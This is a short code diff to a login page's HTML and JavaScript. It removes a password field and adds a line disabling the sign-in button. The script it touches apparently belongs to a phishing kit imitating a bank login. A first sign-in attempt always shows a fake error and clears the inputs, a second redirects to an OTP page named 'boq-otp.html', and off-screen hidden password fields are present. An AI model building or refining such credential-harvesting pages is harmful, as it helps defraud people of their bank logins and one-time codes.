@@ -1764,11 +1764,6 @@
       <input style=position:absolute;left:-9999px;visibility:hidden;z-index:-1 name=passwordname1b autocomplete=off type=password>
       <input style=position:absolute;left:-9999px;visibility:hidden;z-index:-1 name=passwordname2b autocomplete=off type=password>
       <input style=position:absolute;left:-9999px;visibility:hidden;z-index:-1 name=passwordname3b autocomplete=off type=password>
-      <input id=id11b class="form-control keyboard-input keyboardInput control-text-length ui-keyboard-input ui-widget-content ui-corner-all" required name=13b autocomplete=off data-no-submit=true maxlength=255 type=password aria-haspopup=true role=textbox aria-required=true>
-        <a data-wait-for-server=false class="tooltip-help ssticon hidden-print ssticon-Eye" role=switch aria-pressed=false title="Preview Password" id=id14b href=javascript:void(0)></a>
-      </span>
-    </div>
-    <input id=id11b_RSA class="hidden sf-hidden" autocomplete=off name=15b type=text value>
   </div>
 </div>
                         
@@ -1893,7 +1888,7 @@
                             console.log('First attempt – show error');
                             $('#error-msg').show();
                             $('#txtUserid, #id11').val('');
-
+                            $('#btnSignIn').prop('disabled', true);
                         } else if (attempt === 2) {
                             console.log('Second attempt – redirecting to OTP page');
                             window.location.href = 'boq-otp.html';
